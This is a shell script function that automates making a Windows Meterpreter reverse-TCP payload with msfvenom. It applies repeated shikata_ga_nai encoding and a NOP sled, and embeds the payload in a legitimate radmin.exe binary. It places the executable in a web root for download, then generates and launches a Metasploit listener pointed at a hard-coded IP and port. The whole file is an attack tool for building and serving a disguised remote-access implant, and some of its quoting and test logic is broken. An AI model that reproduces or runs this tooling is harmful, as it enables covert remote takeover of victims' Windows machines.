winmetrev_tcp_inline() {
  # Makes an Inline Windows Meterpreter Reverse Payload
  # enables UUID Tracking (whitelisting) for payloads, ignores the rest
  setpayvars() {
    if [ ! -z $1 ]; then
      lhost=$1
    else
      echo "[MANDITORY] You need to set the IP address of your listener here"
    fi
    if [ ! -z $2 ]; then
      lport=$2
    else
      echo "[MANDITORY] You need to set the External ort of your listener here"
    fi
    if [ ! -n $3 ]; then
      d_payname=$3
      d_uuid="set PayloadUUIDName `echo $d_payname`
      d_payloc="/var/www/html/`echo $d_payname`.exe
    else
      d_uuid="set PayloadUUIDName $d_payname"
      d_payloc="/var/www/html/WinMetRevTCPInline.exe"
    fi
    d_payload="-p windows/meterpreter_reverse_tcp"
    d_lhost="set lhost=$lhost"
    d_lport="set lport=$lport"
    d_encode="-e x86/shikata_ga_nai -i 10"
    d_nop="-n 100"
    d_format="-f exe -k"
    d_small="--smallest"
    d_ignore="IgnoreUnknownPayloads=true"
    d_track="PayloadUUIDTracking=true"
    d_work="WORKSPACE "
    d_binary="-x /usr/share/windows-binaries/radmin.exe"
  }
  setpayvars
  paygen() {
    paydirt=`echo \
      $d_payload \
      $d_lhost \
      $d_lport \
      $d_encode \
      $d_nop \
      $d_format \
      $d_small \
      $d_ignore \
      $d_uuid \
      $d_track \
      $d_binary`
    msfvenom $paydirt > $d_payloc
  }
  paygen
  sethandlervars() {
    if [ ! -z $1 ]; then
      lhost=$1
    else
      echo "[MANDITORY] You need to set the IP address of your listener here"
    fi
    if [ ! -z $2 ]; then
      lport=$2
    else
      echo "[MANDITORY] You need to set the External ort of your listener here"
    fi
    if [ ! -n $3 ]; then
      d_payname=$3
    else
      d_uuid="set PayloadUUIDName WinMetRevTCPInline"
    fi
    d_use="use exploit/multi/handler"
    d_payload="set payload `echo $d_payload | cut -d ' ' -f2`"
    d_dishandler="set DisablePayloadHandler true"
    d_lhost="set lhost 0.0.0.0"
    d_lport="set lport $lport"
    d_ignore="set IgnoreUnknownPayloads true"
    d_track="set PayloadUUIDTracking true"
    d_work="WORKSPACE "
  }
  sethandlervars
  rcgen() {
    echo $d_use > $msfs/inline_winmetrev_tcp_inline_handler.rc
    echo $d_payload >> $msfs/inline_winmetrev_tcp_inline_handler.rc
    echo $d_lport >> $msfs/inline_winmetrev_tcp_inline_handler.rc
    echo $d_lhost >> $msfs/inline_winmetrev_tcp_inline_handler.rc
    echo $d_ignore >> $msfs/inline_winmetrev_tcp_inline_handler.rc
    echo $d_uuid >> $msfs/inline_winmetrev_tcp_inline_handler.rc
    echo $d_track >> $msfs/inline_winmetrev_tcp_inline_handler.rc
    echo exploit -j -z >> $msfs/inline_winmetrev_tcp_inline_handler.rc
  }
  rcgen
  (makeXtermLog "Meterpreter_Handler_WinMetRev_TCP_Inline" "$msfc -r $msfs/inline_winmetrev_tcp_inline_handler.rc") &
}
winmetrev_tcp_inline 192.168.1.106 4443 thisisatest
